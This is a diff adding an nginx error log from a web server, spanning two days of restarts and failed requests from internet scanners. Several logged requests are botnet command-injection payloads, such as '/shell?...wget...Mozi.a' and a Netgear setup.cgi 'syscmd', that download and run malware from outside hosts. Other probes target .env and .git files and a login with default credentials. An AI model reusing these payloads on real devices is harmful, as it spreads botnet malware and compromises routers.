@@ -1,0 +1,270 @@
+2022/04/13 05:30:55 [notice] 1#1: using the "epoll" event method
+2022/04/13 05:30:55 [notice] 1#1: nginx/1.20.2
+2022/04/13 05:30:55 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 05:30:55 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 05:30:55 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 05:30:55 [notice] 1#1: start worker processes
+2022/04/13 05:30:55 [notice] 1#1: start worker process 24
+2022/04/13 05:30:55 [notice] 1#1: start worker process 25
+2022/04/13 05:32:06 [error] 24#24: *3 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 58.255.13.54, server: localhost, request: "POST /HNAP1/ HTTP/1.0", host: "8.130.23.133:80"
+2022/04/13 06:17:11 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/13 06:17:11 [notice] 25#25: gracefully shutting down
+2022/04/13 06:17:11 [notice] 25#25: exiting
+2022/04/13 06:17:11 [notice] 25#25: exit
+2022/04/13 06:17:11 [notice] 24#24: gracefully shutting down
+2022/04/13 06:17:11 [notice] 24#24: exiting
+2022/04/13 06:17:11 [notice] 24#24: exit
+2022/04/13 06:17:11 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/13 06:17:11 [notice] 1#1: worker process 25 exited with code 0
+2022/04/13 06:17:11 [notice] 1#1: signal 29 (SIGIO) received
+2022/04/13 06:17:11 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2022/04/13 06:17:11 [notice] 1#1: worker process 24 exited with code 0
+2022/04/13 06:17:11 [notice] 1#1: exit
+2022/04/13 06:17:12 [notice] 1#1: using the "epoll" event method
+2022/04/13 06:17:12 [notice] 1#1: nginx/1.20.2
+2022/04/13 06:17:12 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 06:17:12 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 06:17:12 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 06:17:12 [notice] 1#1: start worker processes
+2022/04/13 06:17:12 [notice] 1#1: start worker process 25
+2022/04/13 06:17:12 [notice] 1#1: start worker process 26
+2022/04/13 06:17:28 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/13 06:17:28 [notice] 25#25: gracefully shutting down
+2022/04/13 06:17:28 [notice] 25#25: exiting
+2022/04/13 06:17:28 [notice] 25#25: exit
+2022/04/13 06:17:28 [notice] 26#26: gracefully shutting down
+2022/04/13 06:17:28 [notice] 26#26: exiting
+2022/04/13 06:17:28 [notice] 26#26: exit
+2022/04/13 06:17:28 [notice] 1#1: signal 17 (SIGCHLD) received from 26
+2022/04/13 06:17:28 [notice] 1#1: worker process 26 exited with code 0
+2022/04/13 06:17:28 [notice] 1#1: signal 29 (SIGIO) received
+2022/04/13 06:17:28 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/13 06:17:28 [notice] 1#1: worker process 25 exited with code 0
+2022/04/13 06:17:28 [notice] 1#1: exit
+2022/04/13 06:17:31 [notice] 1#1: using the "epoll" event method
+2022/04/13 06:17:31 [notice] 1#1: nginx/1.20.2
+2022/04/13 06:17:31 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 06:17:31 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 06:17:31 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 06:17:31 [notice] 1#1: start worker processes
+2022/04/13 06:17:31 [notice] 1#1: start worker process 24
+2022/04/13 06:17:31 [notice] 1#1: start worker process 25
+2022/04/13 06:20:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/13 06:20:53 [notice] 24#24: gracefully shutting down
+2022/04/13 06:20:53 [notice] 25#25: gracefully shutting down
+2022/04/13 06:20:53 [notice] 24#24: exiting
+2022/04/13 06:20:53 [notice] 25#25: exiting
+2022/04/13 06:20:53 [notice] 24#24: exit
+2022/04/13 06:20:53 [notice] 25#25: exit
+2022/04/13 06:20:53 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/13 06:20:53 [notice] 1#1: worker process 24 exited with code 0
+2022/04/13 06:20:53 [notice] 1#1: worker process 25 exited with code 0
+2022/04/13 06:20:53 [notice] 1#1: exit
+2022/04/13 06:20:54 [notice] 1#1: using the "epoll" event method
+2022/04/13 06:20:54 [notice] 1#1: nginx/1.20.2
+2022/04/13 06:20:54 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 06:20:54 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 06:20:54 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 06:20:54 [notice] 1#1: start worker processes
+2022/04/13 06:20:54 [notice] 1#1: start worker process 24
+2022/04/13 06:20:54 [notice] 1#1: start worker process 25
+2022/04/13 06:35:47 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/13 06:35:47 [notice] 25#25: gracefully shutting down
+2022/04/13 06:35:47 [notice] 25#25: exiting
+2022/04/13 06:35:47 [notice] 25#25: exit
+2022/04/13 06:35:47 [notice] 24#24: gracefully shutting down
+2022/04/13 06:35:47 [notice] 24#24: exiting
+2022/04/13 06:35:47 [notice] 24#24: exit
+2022/04/13 06:35:47 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/13 06:35:47 [notice] 1#1: worker process 24 exited with code 0
+2022/04/13 06:35:47 [notice] 1#1: worker process 25 exited with code 0
+2022/04/13 06:35:47 [notice] 1#1: exit
+2022/04/13 06:35:48 [notice] 1#1: using the "epoll" event method
+2022/04/13 06:35:48 [notice] 1#1: nginx/1.20.2
+2022/04/13 06:35:48 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 06:35:48 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 06:35:48 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 06:35:48 [notice] 1#1: start worker processes
+2022/04/13 06:35:48 [notice] 1#1: start worker process 25
+2022/04/13 06:35:48 [notice] 1#1: start worker process 26
+2022/04/13 06:37:58 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/13 06:37:58 [notice] 25#25: gracefully shutting down
+2022/04/13 06:37:58 [notice] 26#26: gracefully shutting down
+2022/04/13 06:37:58 [notice] 26#26: exiting
+2022/04/13 06:37:58 [notice] 25#25: exiting
+2022/04/13 06:37:58 [notice] 26#26: exit
+2022/04/13 06:37:58 [notice] 25#25: exit
+2022/04/13 06:37:58 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/13 06:37:58 [notice] 1#1: worker process 25 exited with code 0
+2022/04/13 06:37:58 [notice] 1#1: worker process 26 exited with code 0
+2022/04/13 06:37:58 [notice] 1#1: exit
+2022/04/13 06:37:59 [notice] 1#1: using the "epoll" event method
+2022/04/13 06:37:59 [notice] 1#1: nginx/1.20.2
+2022/04/13 06:37:59 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 06:37:59 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 06:37:59 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 06:37:59 [notice] 1#1: start worker processes
+2022/04/13 06:37:59 [notice] 1#1: start worker process 25
+2022/04/13 06:37:59 [notice] 1#1: start worker process 26
+2022/04/13 06:38:29 [error] 25#25: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "8.130.23.133"
+2022/04/13 06:38:53 [error] 25#25: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "8.130.23.133"
+2022/04/13 06:40:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/13 06:40:53 [notice] 26#26: gracefully shutting down
+2022/04/13 06:40:53 [notice] 26#26: exiting
+2022/04/13 06:40:53 [notice] 26#26: exit
+2022/04/13 06:40:53 [notice] 25#25: gracefully shutting down
+2022/04/13 06:40:53 [notice] 25#25: exiting
+2022/04/13 06:40:53 [notice] 25#25: exit
+2022/04/13 06:40:53 [notice] 1#1: signal 17 (SIGCHLD) received from 26
+2022/04/13 06:40:53 [notice] 1#1: worker process 26 exited with code 0
+2022/04/13 06:40:53 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/13 06:40:53 [notice] 1#1: worker process 25 exited with code 0
+2022/04/13 06:40:53 [notice] 1#1: exit
+2022/04/13 06:40:54 [notice] 1#1: using the "epoll" event method
+2022/04/13 06:40:54 [notice] 1#1: nginx/1.20.2
+2022/04/13 06:40:54 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 06:40:54 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 06:40:54 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 06:40:54 [notice] 1#1: start worker processes
+2022/04/13 06:40:54 [notice] 1#1: start worker process 24
+2022/04/13 06:40:54 [notice] 1#1: start worker process 25
+2022/04/13 06:40:55 [error] 24#24: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/13 06:47:44 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/13 06:47:44 [notice] 24#24: gracefully shutting down
+2022/04/13 06:47:44 [notice] 25#25: gracefully shutting down
+2022/04/13 06:47:44 [notice] 24#24: exiting
+2022/04/13 06:47:44 [notice] 25#25: exiting
+2022/04/13 06:47:44 [notice] 24#24: exit
+2022/04/13 06:47:44 [notice] 25#25: exit
+2022/04/13 06:47:44 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2022/04/13 06:47:44 [notice] 1#1: worker process 24 exited with code 0
+2022/04/13 06:47:44 [notice] 1#1: signal 29 (SIGIO) received
+2022/04/13 06:47:44 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/13 06:47:44 [notice] 1#1: worker process 25 exited with code 0
+2022/04/13 06:47:44 [notice] 1#1: exit
+2022/04/13 06:47:45 [notice] 1#1: using the "epoll" event method
+2022/04/13 06:47:45 [notice] 1#1: nginx/1.20.2
+2022/04/13 06:47:45 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 06:47:45 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 06:47:45 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 06:47:45 [notice] 1#1: start worker processes
+2022/04/13 06:47:45 [notice] 1#1: start worker process 24
+2022/04/13 06:47:45 [notice] 1#1: start worker process 25
+2022/04/13 06:48:00 [error] 24#24: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/13 06:48:01 [error] 24#24: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/13 06:48:01 [error] 24#24: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/13 06:48:02 [error] 24#24: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/13 06:48:02 [error] 24#24: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/13 06:48:02 [error] 24#24: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 183.242.45.130, server: localhost, request: "GET /index.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/13 06:48:58 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/13 06:48:58 [notice] 24#24: gracefully shutting down
+2022/04/13 06:48:58 [notice] 25#25: gracefully shutting down
+2022/04/13 06:48:58 [notice] 25#25: exiting
+2022/04/13 06:48:58 [notice] 25#25: exit
+2022/04/13 06:48:58 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/13 06:48:58 [notice] 1#1: worker process 25 exited with code 0
+2022/04/13 06:48:58 [notice] 1#1: signal 29 (SIGIO) received
+2022/04/13 06:49:00 [notice] 24#24: exiting
+2022/04/13 06:49:00 [notice] 24#24: exit
+2022/04/13 06:49:00 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2022/04/13 06:49:00 [notice] 1#1: worker process 24 exited with code 0
+2022/04/13 06:49:00 [notice] 1#1: exit
+2022/04/13 06:49:01 [notice] 1#1: using the "epoll" event method
+2022/04/13 06:49:01 [notice] 1#1: nginx/1.20.2
+2022/04/13 06:49:01 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/13 06:49:01 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/13 06:49:01 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/13 06:49:01 [notice] 1#1: start worker processes
+2022/04/13 06:49:01 [notice] 1#1: start worker process 25
+2022/04/13 06:49:01 [notice] 1#1: start worker process 26
+2022/04/13 10:32:13 [error] 26#26: *52 "/usr/share/nginx/html/english/index.html" is not found (2: No such file or directory), client: 125.72.95.217, server: localhost, request: "GET http://www.rfa.org/english/ HTTP/1.1", host: "www.rfa.org"
+2022/04/13 12:22:29 [error] 26#26: *64 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 163.123.142.219, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "8.130.23.133:80"
+2022/04/13 13:28:08 [error] 26#26: *65 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.40.113.84, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.130.23.133", referrer: "http://8.130.23.133/"
+2022/04/13 17:09:45 [error] 26#26: *74 open() "/usr/share/nginx/html/sdk" failed (2: No such file or directory), client: 47.103.155.228, server: localhost, request: "POST /sdk HTTP/1.1", host: "8.130.23.133"
+2022/04/13 17:10:05 [error] 26#26: *75 open() "/usr/share/nginx/html/nmaplowercheck1649869783" failed (2: No such file or directory), client: 47.103.155.228, server: localhost, request: "GET /nmaplowercheck1649869783 HTTP/1.1", host: "8.130.23.133"
+2022/04/13 17:10:05 [error] 26#26: *76 open() "/usr/share/nginx/html/HNAP1" failed (2: No such file or directory), client: 47.103.155.228, server: localhost, request: "GET /HNAP1 HTTP/1.1", host: "8.130.23.133"
+2022/04/13 17:10:05 [error] 26#26: *78 open() "/usr/share/nginx/html/evox/about" failed (2: No such file or directory), client: 47.103.155.228, server: localhost, request: "GET /evox/about HTTP/1.1", host: "8.130.23.133"
+2022/04/14 00:01:49 [error] 26#26: *95 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 138.197.148.129, server: localhost, request: "GET /admin/config.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/14 00:54:41 [error] 26#26: *99 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 20.127.91.237, server: localhost, request: "HEAD /robots.txt HTTP/1.0"
+2022/04/14 01:15:11 [error] 26#26: *101 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 120.85.119.128, server: localhost, request: "POST /HNAP1/ HTTP/1.0", host: "8.130.23.133:80"
+2022/04/14 01:26:34 [error] 26#26: *102 "/usr/share/nginx/html/tftpboot/index.html" is not found (2: No such file or directory), client: 138.197.148.129, server: localhost, request: "GET /tftpboot/ HTTP/1.1", host: "8.130.23.133"
+2022/04/14 01:41:45 [error] 26#26: *104 open() "/usr/share/nginx/html/000000000000.cfg" failed (2: No such file or directory), client: 138.197.148.129, server: localhost, request: "GET /000000000000.cfg HTTP/1.1", host: "8.130.23.133"
+2022/04/14 01:52:02 [error] 26#26: *105 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 61.53.150.92, server: localhost, request: "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0"
+2022/04/14 02:05:50 [error] 26#26: *106 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 138.197.148.129, server: localhost, request: "GET /vicidial/welcome.php HTTP/1.1", upstream: "fastcgi://172.23.205.216:9000", host: "8.130.23.133"
+2022/04/14 04:57:11 [error] 26#26: *114 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 49.143.32.6, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "8.130.23.133:80"
+2022/04/14 09:03:21 [error] 26#26: *134 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 117.9.214.67, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1", host: "127.0.0.1:80"
+2022/04/14 10:35:40 [error] 26#26: *138 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 198.23.219.105, server: localhost, request: "GET /.env HTTP/1.1", host: "8.130.23.133"
+2022/04/14 10:41:05 [error] 26#26: *140 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 198.23.219.105, server: localhost, request: "GET /.env HTTP/1.1", host: "8.130.23.133"
+2022/04/14 11:19:01 [error] 26#26: *142 open() "/usr/share/nginx/html/config/getuser" failed (2: No such file or directory), client: 163.123.142.219, server: localhost, request: "GET /config/getuser?index=0 HTTP/1.1", host: "8.130.23.133:80"
+2022/04/14 12:39:22 [error] 26#26: *144 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 106.75.162.130, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.130.23.133"
+2022/04/14 13:29:29 [error] 26#26: *147 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 113.90.246.213, server: localhost, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://113.90.246.213:43033/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
+2022/04/14 15:08:12 [error] 26#26: *151 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 156.223.9.3, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+23.94.50.159/jaws;sh+/tmp/jaws HTTP/1.1", host: "127.0.0.1:80"
+2022/04/14 15:29:34 [error] 26#26: *152 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 45.77.197.5, server: localhost, request: "GET /.env HTTP/1.1", host: "8.130.23.133"
+2022/04/14 16:37:08 [error] 26#26: *177 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 178.72.75.16, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "8.130.23.133:80"
+2022/04/14 17:22:13 [error] 26#26: *178 open() "/usr/share/nginx/html/portal/redlion" failed (2: No such file or directory), client: 192.241.224.137, server: localhost, request: "GET /portal/redlion HTTP/1.1", host: "8.130.23.133"
+2022/04/14 17:51:45 [error] 26#26: *183 open() "/usr/share/nginx/html/actuator/health" failed (2: No such file or directory), client: 192.241.224.67, server: localhost, request: "GET /actuator/health HTTP/1.1", host: "8.130.23.133"
+2022/04/14 18:02:02 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/14 18:02:02 [notice] 26#26: gracefully shutting down
+2022/04/14 18:02:02 [notice] 26#26: exiting
+2022/04/14 18:02:02 [notice] 26#26: exit
+2022/04/14 18:02:02 [notice] 25#25: gracefully shutting down
+2022/04/14 18:02:02 [notice] 25#25: exiting
+2022/04/14 18:02:02 [notice] 25#25: exit
+2022/04/14 18:02:02 [notice] 1#1: signal 17 (SIGCHLD) received from 26
+2022/04/14 18:02:02 [notice] 1#1: worker process 26 exited with code 0
+2022/04/14 18:02:02 [notice] 1#1: signal 29 (SIGIO) received
+2022/04/14 18:02:02 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/14 18:02:02 [notice] 1#1: worker process 25 exited with code 0
+2022/04/14 18:02:02 [notice] 1#1: exit
+2022/04/14 18:02:10 [notice] 1#1: using the "epoll" event method
+2022/04/14 18:02:10 [notice] 1#1: nginx/1.20.2
+2022/04/14 18:02:10 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/14 18:02:10 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/14 18:02:10 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/14 18:02:10 [notice] 1#1: start worker processes
+2022/04/14 18:02:10 [notice] 1#1: start worker process 24
+2022/04/14 18:02:10 [notice] 1#1: start worker process 25
+2022/04/14 18:02:24 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/14 18:02:24 [notice] 24#24: gracefully shutting down
+2022/04/14 18:02:24 [notice] 24#24: exiting
+2022/04/14 18:02:24 [notice] 24#24: exit
+2022/04/14 18:02:24 [notice] 25#25: gracefully shutting down
+2022/04/14 18:02:24 [notice] 25#25: exiting
+2022/04/14 18:02:24 [notice] 25#25: exit
+2022/04/14 18:02:24 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2022/04/14 18:02:24 [notice] 1#1: worker process 24 exited with code 0
+2022/04/14 18:02:24 [notice] 1#1: signal 29 (SIGIO) received
+2022/04/14 18:02:24 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/14 18:02:24 [notice] 1#1: worker process 25 exited with code 0
+2022/04/14 18:02:24 [notice] 1#1: exit
+2022/04/14 18:02:29 [notice] 1#1: using the "epoll" event method
+2022/04/14 18:02:29 [notice] 1#1: nginx/1.20.2
+2022/04/14 18:02:29 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/14 18:02:29 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/14 18:02:29 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/14 18:02:29 [notice] 1#1: start worker processes
+2022/04/14 18:02:29 [notice] 1#1: start worker process 24
+2022/04/14 18:02:29 [notice] 1#1: start worker process 25
+2022/04/14 18:28:13 [error] 24#24: *8 open() "/usr/share/nginx/html/.git/HEAD" failed (2: No such file or directory), client: 185.82.218.64, server: localhost, request: "GET /.git/HEAD HTTP/1.0"
+2022/04/14 19:08:10 [error] 24#24: *10 open() "/usr/share/nginx/html/hudson" failed (2: No such file or directory), client: 192.241.216.44, server: localhost, request: "GET /hudson HTTP/1.1", host: "8.130.23.133"
+2022/04/14 19:09:29 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/04/14 19:09:29 [notice] 25#25: gracefully shutting down
+2022/04/14 19:09:29 [notice] 25#25: exiting
+2022/04/14 19:09:29 [notice] 25#25: exit
+2022/04/14 19:09:29 [notice] 24#24: gracefully shutting down
+2022/04/14 19:09:29 [notice] 24#24: exiting
+2022/04/14 19:09:29 [notice] 24#24: exit
+2022/04/14 19:09:29 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2022/04/14 19:09:29 [notice] 1#1: worker process 25 exited with code 0
+2022/04/14 19:09:29 [notice] 1#1: signal 29 (SIGIO) received
+2022/04/14 19:09:29 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2022/04/14 19:09:29 [notice] 1#1: worker process 24 exited with code 0
+2022/04/14 19:09:29 [notice] 1#1: exit
+2022/04/14 19:09:30 [notice] 1#1: using the "epoll" event method
+2022/04/14 19:09:30 [notice] 1#1: nginx/1.20.2
+2022/04/14 19:09:30 [notice] 1#1: built by gcc 10.3.1 20210424 (Alpine 10.3.1_git20210424) 
+2022/04/14 19:09:30 [notice] 1#1: OS: Linux 4.18.0-348.7.1.el8_5.x86_64
+2022/04/14 19:09:30 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/04/14 19:09:30 [notice] 1#1: start worker processes
+2022/04/14 19:09:30 [notice] 1#1: start worker process 24
+2022/04/14 19:09:30 [notice] 1#1: start worker process 25
